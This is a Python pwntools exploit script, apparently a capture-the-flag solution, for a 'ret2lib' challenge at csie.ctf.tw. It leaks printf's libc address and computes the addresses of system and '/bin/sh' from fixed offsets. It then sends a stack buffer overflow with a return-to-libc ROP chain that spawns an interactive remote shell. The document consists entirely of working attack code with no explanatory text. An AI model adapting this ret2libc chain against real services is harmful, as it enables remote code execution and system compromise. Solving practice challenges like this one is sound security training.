#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10127)
# r = process('./ret2lib')
r.recvuntil(':')
r.sendline('0x601020')

print r.recvuntil(':')
content = r.recvline()
print content

printf_addr = int(content, 16)
system_addr = int(printf_addr - 0x10470)
binsh_addr = printf_addr + 0x137517

print 'printf_addr:', hex(printf_addr)
print 'system_addr:', hex(system_addr)

r.sendline( 'A' *0x38 + p64(0x400823) + p64(binsh_addr) + p64(system_addr) + p64(0x400541))

r.recv()

r.interactive()

